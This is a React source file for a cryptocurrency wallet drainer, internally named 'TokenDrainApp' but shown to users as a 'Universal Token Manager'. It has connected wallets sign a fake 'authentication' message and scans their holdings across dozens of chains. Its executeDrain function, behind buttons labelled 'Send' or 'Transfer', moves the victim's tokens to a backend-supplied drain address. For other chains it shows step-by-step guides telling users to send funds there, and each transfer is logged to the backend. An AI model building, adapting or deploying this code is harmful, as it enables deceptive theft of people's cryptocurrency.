import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (Scannable via Covalent)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#627EEA' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', scanner: 'covalent', color: '#F0B90B' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', scanner: 'covalent', color: '#8247E5' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#28A0F0' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#FF0420' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#0052FF' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', scanner: 'covalent', color: '#E84142' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', scanner: 'covalent', color: '#1969FF' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', scanner: 'covalent', color: '#04795B' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', scanner: 'covalent', color: '#35D07F' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', scanner: 'covalent', color: '#53CBC9' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', scanner: 'covalent', color: '#00DACC' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', scanner: 'covalent', color: '#121C36' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', scanner: 'covalent', color: '#00AEE9' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', scanner: 'covalent', color: '#78D64B' },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', scanner: 'covalent', color: '#00B894' },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', scanner: 'covalent', color: '#F3B82C' },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', scanner: 'covalent', color: '#D92B6F' },
  
  // Non-EVM Chains with DIRECT API scanning
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', scanner: 'tron', color: '#FF060A', addressPrefix: 'T' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', scanner: 'solana', color: '#00FFA3', addressPrefix: '' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', scanner: 'blockchain', color: '#F7931A', addressPrefix: '1|3|bc1' },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', scanner: 'blockfrost', color: '#0033AD', addressPrefix: 'addr' },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', scanner: 'blockchain', color: '#C2A633', addressPrefix: 'D|A' },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', scanner: 'blockchain', color: '#BFBBBB', addressPrefix: 'L|M|3' },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', scanner: 'xrpl', color: '#23292F', addressPrefix: 'r' },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', scanner: 'subscan', color: '#E6007A', addressPrefix: '1' },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', scanner: 'cosmos', color: '#2E3148', addressPrefix: 'cosmos' },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', scanner: 'binance', color: '#F0B90B', addressPrefix: 'bnb' },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', scanner: 'stellar', color: '#14B6E8', addressPrefix: 'G' },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', scanner: 'monero', color: '#FF6600', addressPrefix: '4|8' },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', scanner: 'blockchain', color: '#F4B728', addressPrefix: 't|z' },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', scanner: 'blockchain', color: '#008DE4', addressPrefix: 'X' },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', scanner: 'tzkt', color: '#2C7DF7', addressPrefix: 'tz' },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', scanner: 'algoexplorer', color: '#000000', addressPrefix: '' },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', scanner: 'vechain', color: '#15BDFF', addressPrefix: '0x' },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', scanner: 'neoscan', color: '#58BF00', addressPrefix: 'A' },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', scanner: 'eos', color: '#000000', addressPrefix: '' },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', scanner: 'tron_trc20', color: '#26A17B', parent: 'tron' },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', scanner: 'solana_spl', color: '#2775CA', parent: 'solana' },
];

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
            "--ck-border-radius": "16px",
            "--ck-accent-color": "#667eea",
            "--ck-accent-text-color": "#ffffff",
            "--ck-modal-background": "#1a1a2e",
            "--ck-body-background": "#16213e",
            "--ck-body-color": "#ffffff",
            "--ck-body-color-muted": "#94a3b8",
          },
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  // State Management
  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [backendUrl, setBackendUrl] = useState('http://localhost:3001');
  const [userTokens, setUserTokens] = useState({});
  const [txStatus, setTxStatus] = useState({});
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, text: '' });
  const [apiStatus, setApiStatus] = useState('Checking...');
  const [manualAddresses, setManualAddresses] = useState({});
  const [activeTab, setActiveTab] = useState('tokens');
  const [priceData, setPriceData] = useState({});

  // Initialize
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      resetState();
    }
    checkApiStatus();
    fetchTokenPrices();
  }, [isConnected, address]);

  // Check Backend Status
  const checkApiStatus = async () => {
    try {
      const response = await fetch(`${backendUrl}/health`);
      if (response.ok) {
        const data = await response.json();
        setApiStatus(`🟢 Online - ${data.stats?.networks || 0} networks`);
      } else {
        setApiStatus('🔴 Offline - Using backup');
      }
    } catch (error) {
      setApiStatus('🔴 Offline - Check backend');
    }
  };

  // Fetch Token Prices
  const fetchTokenPrices = async () => {
    try {
      const response = await fetch(`${backendUrl}/prices`);
      if (response.ok) {
        const data = await response.json();
        setPriceData(data.prices || {});
      }
    } catch (error) {
      console.log('Price fetch failed:', error.message);
    }
  };

  // Reset State
  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens({});
    setTxStatus({});
    setScanProgress({ current: 0, total: NETWORKS.length, text: '' });
  };

  // Wallet Connected Handler
  const handleWalletConnected = async (walletAddress) => {
    setAuthStatus(`✅ Connected: ${formatAddress(walletAddress)}`);
    
    // Pre-fill known addresses for non-EVM chains
    const initialAddresses = {};
    NETWORKS.filter(n => n.type === 'non-evm').forEach(network => {
      // Try to get address from wallet or localStorage
      const stored = localStorage.getItem(`address_${network.id}`);
      if (stored) initialAddresses[network.id] = stored;
    });
    setManualAddresses(initialAddresses);
  };

  // ==================== AUTHENTICATION ====================
  const authenticateAllNetworks = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing authentication message...');
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nNetworks: ${NETWORKS.length}`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('📡 Sending to backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature: sig,
          message,
          networks: NETWORKS,
          manualAddresses: manualAddresses
        })
      });
      
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus(`✅ Authenticated for ${data.data?.totalNetworks || 0} networks!`);
        setTimeout(() => scanAllNetworks(), 800);
      } else {
        setAuthStatus(`❌ Auth failed: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      setAuthStatus(`❌ Error: ${error.message}`);
      if (error.message.includes('rejected')) {
        setAuthStatus('❌ Signature rejected by user');
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
    setUserTokens({});
    setScanProgress({ current: 0, total: NETWORKS.length, text: 'Starting scan...' });
    
    try {
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          evmAddress: address,
          manualAddresses: manualAddresses,
          networks: NETWORKS
        })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Backend error: ${response.status} - ${errorText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`⚠️ Scan error: ${error.message}. Trying batch scan...`);
      await batchScanNetworks();
    } finally {
      setIsScanning(false);
    }
  };

  // Process Scan Results
  const processScanResults = (data) => {
    const allTokens = {};
    let totalValue = 0;
    let totalTokens = 0;
    
    data.results?.forEach(result => {
      if (result.tokens && result.tokens.length > 0) {
        // Apply prices if available
        result.tokens = result.tokens.map(token => ({
          ...token,
          value: token.value || (priceData[token.symbol] || 0) * token.amount
        }));
        
        const networkValue = result.tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        totalValue += networkValue;
        totalTokens += result.tokens.length;
        
        allTokens[result.network.id] = {
          network: result.network,
          tokens: result.tokens,
          totalValue: networkValue
        };
      }
    });
    
    setUserTokens(allTokens);
    setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, text: 'Complete' });
    
    setAuthStatus(`✅ Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalValue.toFixed(2)} total)`);
    
    // Store in localStorage
    localStorage.setItem(`scan_${address}`, JSON.stringify({
      timestamp: Date.now(),
      tokens: allTokens,
      totalValue
    }));
  };

  // Batch Scan Fallback
  const batchScanNetworks = async () => {
    const batchSize = 5;
    const results = {};
    
    for (let i = 0; i < NETWORKS.length; i += batchSize) {
      const batch = NETWORKS.slice(i, i + batchSize);
      setScanProgress({ 
        current: i, 
        total: NETWORKS.length, 
        text: `Scanning ${batch.map(n => n.symbol).join(', ')}...` 
      });
      
      for (const network of batch) {
        try {
          const networkResult = await scanSingleNetwork(network);
          if (networkResult && networkResult.tokens.length > 0) {
            results[network.id] = networkResult;
          }
        } catch (error) {
          console.log(`Failed to scan ${network.name}:`, error.message);
        }
      }
      
      // Small delay between batches
      await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    const allTokens = {};
    Object.values(results).forEach(result => {
      allTokens[result.network.id] = result;
    });
    
    setUserTokens(allTokens);
  };

  // Scan Single Network
  const scanSingleNetwork = async (network) => {
    let url = '';
    
    if (network.type === 'evm') {
      url = `${backendUrl}/tokens/evm/${address}/${network.id}`;
    } else {
      const networkAddress = manualAddresses[network.id] || address;
      url = `${backendUrl}/tokens/nonevm/${networkAddress}/${network.id}`;
    }
    
    try {
      const response = await fetch(url);
      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          return {
            network: network,
            tokens: data.data.tokens || [],
            totalValue: data.data.summary?.totalValue || 0
          };
        }
      }
    } catch (error) {
      console.error(`Scan failed for ${network.name}:`, error);
    }
    
    return { network, tokens: [], totalValue: 0 };
  };

  // ==================== TOKEN DRAIN ====================
  const executeDrain = async (token, network) => {
    if (!address && !manualAddresses[network.id]) {
      setTxStatus(prev => ({...prev, [token.networkId]: 'No address available'}));
      return;
    }

    try {
      setIsAuthenticating(true);
      setTxStatus(prev => ({...prev, [token.networkId]: 'Preparing transaction...'}));
      
      // Determine source address
      const sourceAddress = network.type === 'evm' ? address : manualAddresses[network.id];
      
      // Prepare transaction data
      const txData = {
        fromAddress: sourceAddress,
        toAddress: token.drainAddress || network.drainAddress,
        amount: token.amount.toString(),
        chainId: token.networkId,
        tokenSymbol: token.symbol,
        tokenAddress: token.contractAddress,
        tokenType: token.isNative ? 'native' : 'token',
        networkType: network.type,
        decimals: token.decimals || 18
      };
      
      // For EVM native tokens
      if (network.type === 'evm' && token.isNative && walletClient) {
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus(prev => ({...prev, [token.networkId]: 'Amount too small'}));
          return;
        }
        
        setTxStatus(prev => ({...prev, [token.networkId]: 'Confirm in wallet...'}));
        
        const hash = await walletClient.sendTransaction({
          to: txData.toAddress,
          value: amountInWei,
          chainId: parseInt(token.networkId)
        });
        
        txData.transactionHash = hash;
        setTxStatus(prev => ({...prev, [token.networkId]: `✅ Sent: ${hash.substring(0, 10)}...`}));
        
      } else if (network.id === 'tron') {
        // TRON-specific handling
        setTxStatus(prev => ({...prev, [token.networkId]: 'TRON: Manual transfer required'}));
        alert(`TRON Transfer Required:\n\nSend ${token.amount} ${token.symbol} to:\n${txData.toAddress}\n\nFrom: ${sourceAddress}\n\nNote: TRX requires energy/bandwidth for transfers.`);
        
      } else {
        // Non-EVM or ERC20 tokens
        setTxStatus(prev => ({...prev, [token.networkId]: `Send ${token.amount} ${token.symbol} to ${txData.toAddress}`}));
        
        if (window.confirm(`Send ${token.amount} ${token.symbol} to:\n${txData.toAddress}\n\nClick OK to confirm.`)) {
          // Generate transaction guide
          const guide = generateTransactionGuide(token, network, txData);
          alert(guide);
        }
      }
      
      // Log transaction to backend
      await logTransaction(txData);
      
      // Remove from UI
      removeTokenFromUI(token, network.id);
      
    } catch (error) {
      console.error("Drain error:", error);
      setTxStatus(prev => ({...prev, [token.networkId]: `Error: ${error.shortMessage || error.message}`}));
    } finally {
      setIsAuthenticating(false);
    }
  };

  // Generate Transaction Guide for Non-EVM
  const generateTransactionGuide = (token, network, txData) => {
    const guides = {
      'bitcoin': `Bitcoin (BTC) Transfer:\n\n1. Open your Bitcoin wallet\n2. Send ${token.amount} BTC to:\n${txData.toAddress}\n3. Network: Bitcoin Mainnet\n4. Fee: Use recommended fee`,
      'solana': `Solana (SOL) Transfer:\n\n1. Open Phantom/Solflare wallet\n2. Send ${token.amount} SOL to:\n${txData.toAddress}\n3. Network: Solana Mainnet`,
      'cardano': `Cardano (ADA) Transfer:\n\n1. Open Yoroi/Daedalus wallet\n2. Send ${token.amount} ADA to:\n${txData.toAddress}\n3. Network: Cardano Mainnet`,
      'dogecoin': `Dogecoin (DOGE) Transfer:\n\n1. Open Dogecoin wallet\n2. Send ${token.amount} DOGE to:\n${txData.toAddress}\n3. Network: Dogecoin Mainnet`,
      'default': `Manual Transfer Required:\n\nSend ${token.amount} ${token.symbol} to:\n${txData.toAddress}\n\nNetwork: ${network.name}\nFrom: ${txData.fromAddress}`
    };
    
    return guides[network.id] || guides.default;
  };

  // Remove Token from UI
  const removeTokenFromUI = (token, networkId) => {
    setUserTokens(prev => {
      const updated = {...prev};
      if (updated[networkId]) {
        updated[networkId].tokens = updated[networkId].tokens.filter(t => 
          t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
        );
        
        // Recalculate total
        updated[networkId].totalValue = updated[networkId].tokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        // Remove network if no tokens left
        if (updated[networkId].tokens.length === 0) {
          delete updated[networkId];
        }
      }
      return updated;
    });
  };

  // Log Transaction
  const logTransaction = async (txData) => {
    try {
      const response = await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
      
      if (!response.ok) {
        console.log('Logging failed, but transaction may still succeed');
      }
    } catch (error) {
      console.log('Logging error:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length > 20) {
      return `${addr.substring(0, 8)}...${addr.substring(addr.length - 6)}`;
    }
    return addr;
  };

  const formatAmount = (amount, decimals = 8) => {
    return parseFloat(amount).toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: decimals
    });
  };

  const getTotalValue = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.totalValue, 0).toFixed(2);
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-content">
            <div className="logo-section">
              <div className="logo-icon">🌐</div>
              <div>
                <h1>Universal Token Manager</h1>
                <p className="tagline">Scan, View & Transfer tokens across 50+ blockchains</p>
              </div>
            </div>
            
            <div className="header-right">
              <div className="api-status">
                <span>Backend: {apiStatus}</span>
              </div>
              <div className="network-count">
                <span>{NETWORKS.length} Networks</span>
              </div>
              <div className="wallet-section">
                <ConnectKitButton />
              </div>
            </div>
          </div>
        </header>

        <main className="app-main">
          {isConnected && address ? (
            <>
              {/* Network Tabs */}
              <div className="network-tabs">
                <button 
                  className={`tab ${activeTab === 'tokens' ? 'active' : ''}`}
                  onClick={() => setActiveTab('tokens')}
                >
                  📊 Tokens
                </button>
                <button 
                  className={`tab ${activeTab === 'networks' ? 'active' : ''}`}
                  onClick={() => setActiveTab('networks')}
                >
                  🌐 Networks ({getNetworkCount()}/{NETWORKS.length})
                </button>
                <button 
                  className={`tab ${activeTab === 'addresses' ? 'active' : ''}`}
                  onClick={() => setActiveTab('addresses')}
                >
                  🔑 Address Manager
                </button>
                <button 
                  className={`tab ${activeTab === 'settings' ? 'active' : ''}`}
                  onClick={() => setActiveTab('settings')}
                >
                  ⚙️ Settings
                </button>
              </div>

              <div className="dashboard-grid">
                {/* Control Panel */}
                <div className="panel control-panel">
                  <div className="panel-header">
                    <h2>Control Center</h2>
                    <div className="wallet-status connected">
                      <span className="status-dot"></span>
                      {formatAddress(address)}
                    </div>
                  </div>
                  
                  <div className="wallet-info">
                    <div className="info-item">
                      <span className="label">EVM Address:</span>
                      <span className="value mono">{formatAddress(address)}</span>
                    </div>
                    <div className="info-item">
                      <span className="label">Networks Configured:</span>
                      <span className="value">{Object.keys(manualAddresses).length} non-EVM</span>
                    </div>
                    <div className="info-item">
                      <span className="label">Last Scan:</span>
                      <span className="value">
                        {localStorage.getItem(`scan_${address}_time`) 
                          ? new Date(parseInt(localStorage.getItem(`scan_${address}_time`))).toLocaleTimeString()
                          : 'Never'
                        }
                      </span>
                    </div>
                  </div>

                  <div className="status-container">
                    <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
                      {authStatus || 'Ready to scan all networks'}
                    </div>
                    
                    {isScanning && (
                      <div className="progress-container">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${(scanProgress.current / scanProgress.total) * 100}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">
                          {scanProgress.text} ({scanProgress.current}/{scanProgress.total})
                        </div>
                      </div>
                    )}
                    
                    {signature && (
                      <div className="signature-preview">
                        <span className="mono">Auth: {signature.substring(0, 10)}...</span>
                      </div>
                    )}
                  </div>

                  <div className="action-buttons">
                    <button 
                      onClick={authenticateAllNetworks}
                      disabled={isAuthenticating || isScanning}
                      className="btn btn-primary btn-lg"
                    >
                      {isAuthenticating ? (
                        <>
                          <span className="spinner"></span>
                          Authenticating...
                        </>
                      ) : (
                        <>
                          <span className="btn-icon">🔐</span>
                          Authenticate & Scan All
                        </>
                      )}
                    </button>
                    
                    <button 
                      onClick={scanAllNetworks}
                      disabled={isScanning || isAuthenticating}
                      className="btn btn-secondary"
                    >
                      {isScanning ? (
                        <>
                          <span className="spinner"></span>
                          Scanning...
                        </>
                      ) : (
                        <>
                          <span className="btn-icon">🔍</span>
                          Rescan Networks
                        </>
                      )}
                    </button>
                    
                    <button 
                      onClick={fetchTokenPrices}
                      disabled={isScanning}
                      className="btn btn-outline"
                    >
                      <span className="btn-icon">💱</span>
                      Refresh Prices
                    </button>
                  </div>

                  {/* Quick Stats */}
                  {getNetworkCount() > 0 && (
                    <div className="quick-stats">
                      <h3>Portfolio Summary</h3>
                      <div className="stats-grid">
                        <div className="stat">
                          <span className="stat-value">{getNetworkCount()}</span>
                          <span className="stat-label">Active Networks</span>
                        </div>
                        <div className="stat">
                          <span className="stat-value">{getTotalTokens()}</span>
                          <span className="stat-label">Token Types</span>
                        </div>
                        <div className="stat">
                          <span className="stat-value">${getTotalValue()}</span>
                          <span className="stat-label">Total Value</span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                {/* Main Content Area */}
                <div className="panel main-panel">
                  {activeTab === 'tokens' ? (
                    <div className="tokens-view">
                      <div className="view-header">
                        <h2>Detected Tokens</h2>
                        <div className="view-actions">
                          <span className="summary">
                            {getNetworkCount()} Networks • {getTotalTokens()} Tokens • ${getTotalValue()}
                          </span>
                          {getTotalTokens() > 0 && (
                            <button 
                              className="btn btn-danger btn-sm"
                              onClick={() => {
                                if (window.confirm('WARNING: This will attempt to drain ALL tokens to their respective addresses. Confirm?')) {
                                  // Implement bulk drain
                                }
                              }}
                              disabled={isAuthenticating}
                            >
                              Drain All
                            </button>
                          )}
                        </div>
                      </div>

                      {getNetworkCount() === 0 ? (
                        <div className="empty-state">
                          <div className="empty-icon">💰</div>
                          <h3>No tokens detected yet</h3>
                          <p>Click "Authenticate & Scan All" to discover tokens across all blockchains</p>
                          <div className="network-hint">
                            <p><strong>Supported chains include:</strong></p>
                            <div className="chain-tags">
                              {NETWORKS.slice(0, 10).map(n => (
                                <span key={n.id} className="chain-tag" style={{ borderColor: n.color }}>
                                  {n.symbol}
                                </span>
                              ))}
                              <span className="chain-tag">+{NETWORKS.length - 10} more</span>
                            </div>
                          </div>
                        </div>
                      ) : (
                        <div className="network-sections">
                          {Object.entries(userTokens).map(([networkId, data]) => (
                            <NetworkSection 
                              key={networkId}
                              data={data}
                              txStatus={txStatus}
                              isAuthenticating={isAuthenticating}
                              executeDrain={executeDrain}
                              formatAmount={formatAmount}
                            />
                          ))}
                        </div>
                      )}
                    </div>
                  ) : activeTab === 'addresses' ? (
                    <AddressManager 
                      manualAddresses={manualAddresses}
                      setManualAddresses={setManualAddresses}
                      NETWORKS={NETWORKS}
                    />
                  ) : activeTab === 'networks' ? (
                    <NetworkManager 
                      NETWORKS={NETWORKS}
                      userTokens={userTokens}
                    />
                  ) : (
                    <SettingsPanel 
                      backendUrl={backendUrl}
                      setBackendUrl={setBackendUrl}
                      checkApiStatus={checkApiStatus}
                      apiStatus={apiStatus}
                    />
                  )}
                </div>
              </div>
            </>
          ) : (
            <ConnectionPrompt NETWORKS={NETWORKS} />
          )}
        </main>

        <Footer apiStatus={apiStatus} checkApiStatus={checkApiStatus} />
      </div>
    </div>
  );
}

// ==================== SUPPORTING COMPONENTS ====================

function NetworkSection({ data, txStatus, isAuthenticating, executeDrain, formatAmount }) {
  return (
    <div className="network-section">
      <div className="network-header" style={{ borderLeftColor: data.network.color }}>
        <div className="network-info">
          <div className="network-name">
            <span className="network-icon" style={{ backgroundColor: data.network.color }}>
              {data.network.type === 'non-evm' ? '⛓️' : '🔗'}
            </span>
            {data.network.name} ({data.network.symbol})
            {data.network.type === 'non-evm' && <span className="chain-badge">Non-EVM</span>}
          </div>
          <div className="network-stats">
            <span className="token-count">{data.tokens.length} token(s)</span>
            <span className="network-value">${data.totalValue.toFixed(2)}</span>
          </div>
        </div>
        <div className="network-status">
          {txStatus[data.network.id] ? (
            <span className="tx-status">{txStatus[data.network.id]}</span>
          ) : (
            <span className="ready">Ready</span>
          )}
        </div>
      </div>

      <div className="tokens-grid">
        {data.tokens.map((token, idx) => (
          <div key={idx} className="token-card">
            <div className="token-header">
              <div className="token-icon">
                {token.logo ? (
                  <img src={token.logo} alt={token.symbol} />
                ) : (
                  <div className="token-placeholder" style={{ backgroundColor: data.network.color }}>
                    {token.symbol.substring(0, 3)}
                  </div>
                )}
              </div>
              <div className="token-symbol">{token.symbol}</div>
              {token.value > 0 && (
                <div className="token-value">${token.value.toFixed(2)}</div>
              )}
            </div>
            
            <div className="token-details">
              <div className="token-name">{token.name}</div>
              <div className="token-amount">
                {formatAmount(token.amount, token.decimals < 8 ? token.decimals : 8)} {token.symbol}
              </div>
              {token.contractAddress && token.contractAddress !== '0x' && (
                <div className="token-contract">
                  {token.contractAddress.substring(0, 12)}...
                </div>
              )}
            </div>
            
            <div className="token-actions">
              <button
                onClick={() => executeDrain(token, data.network)}
                disabled={token.amount <= 0 || isAuthenticating}
                className={`drain-btn ${data.network.id === 'tron' ? 'tron-btn' : ''}`}
                title={data.network.type === 'non-evm' ? 'Manual transfer required' : 'Send tokens'}
              >
                {data.network.type === 'non-evm' ? 'Transfer' : 'Send'}
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AddressManager({ manualAddresses, setManualAddresses, NETWORKS }) {
  const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
  
  const handleAddressChange = (networkId, value) => {
    const updated = { ...manualAddresses, [networkId]: value };
    setManualAddresses(updated);
    localStorage.setItem(`manualAddresses`, JSON.stringify(updated));
  };

  const importFromTrustWallet = () => {
    // This would typically integrate with Trust Wallet's API
    alert('For Trust Wallet integration:\n1. Open Trust Wallet\n2. Go to each chain\n3. Copy your address\n4. Paste it here');
  };

  return (
    <div className="address-manager">
      <div className="manager-header">
        <h2>Non-EVM Address Manager</h2>
        <p>Enter your addresses for non-EVM chains to enable scanning</p>
        <button className="btn btn-outline" onClick={importFromTrustWallet}>
          <span className="btn-icon">📱</span>
          Trust Wallet Help
        </button>
      </div>
      
      <div className="address-grid">
        {nonEvmNetworks.map(network => (
          <div key={network.id} className="address-input-group">
            <label>
              <div className="network-label">
                <span className="network-dot" style={{ backgroundColor: network.color }}></span>
                {network.name} ({network.symbol})
              </div>
              <input
                type="text"
                value={manualAddresses[network.id] || ''}
                onChange={(e) => handleAddressChange(network.id, e.target.value)}
                placeholder={`Your ${network.name} address (${network.addressPrefix})`}
                className="address-input"
              />
              {network.addressPrefix && (
                <div className="address-hint">Starts with: {network.addressPrefix}</div>
              )}
            </label>
            {manualAddresses[network.id] && (
              <div className="address-preview">
                {formatAddress(manualAddresses[network.id])}
              </div>
            )}
          </div>
        ))}
      </div>
      
      <div className="manager-footer">
        <p><strong>Tip:</strong> Find your addresses in Trust Wallet by switching networks in the app</p>
        <button 
          className="btn btn-primary"
          onClick={() => alert('Addresses saved! Now scan to detect tokens.')}
        >
          Save All Addresses
        </button>
      </div>
    </div>
  );
}

function NetworkManager({ NETWORKS, userTokens }) {
  return (
    <div className="network-manager">
      <h2>Network Status</h2>
      <p>All supported blockchains and their scan status</p>
      
      <div className="network-status-grid">
        {NETWORKS.map(network => {
          const hasTokens = userTokens[network.id]?.tokens?.length > 0;
          return (
            <div key={network.id} className="network-status-card">
              <div className="status-header" style={{ borderColor: network.color }}>
                <div className="status-icon" style={{ backgroundColor: network.color }}>
                  {network.type === 'evm' ? 'E' : 'N'}
                </div>
                <div className="status-name">{network.name}</div>
                <div className={`status-indicator ${hasTokens ? 'active' : 'inactive'}`}>
                  {hasTokens ? '💰' : '🔍'}
                </div>
              </div>
              <div className="status-details">
                <div className="detail">
                  <span>Type:</span>
                  <span>{network.type === 'evm' ? 'EVM' : 'Non-EVM'}</span>
                </div>
                <div className="detail">
                  <span>Scanner:</span>
                  <span>{network.scanner || 'API'}</span>
                </div>
                <div className="detail">
                  <span>Tokens:</span>
                  <span>{userTokens[network.id]?.tokens?.length || 0}</span>
                </div>
                <div className="detail">
                  <span>Value:</span>
                  <span>${userTokens[network.id]?.totalValue?.toFixed(2) || '0.00'}</span>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function SettingsPanel({ backendUrl, setBackendUrl, checkApiStatus, apiStatus }) {
  return (
    <div className="settings-panel">
      <h2>Settings</h2>
      
      <div className="setting-group">
        <label>Backend URL</label>
        <div className="setting-input">
          <input
            type="text"
            value={backendUrl}
            onChange={(e) => setBackendUrl(e.target.value)}
            placeholder="http://localhost:3001 or https://your-backend.com"
          />
          <button onClick={checkApiStatus} className="btn btn-sm">
            Test Connection
          </button>
        </div>
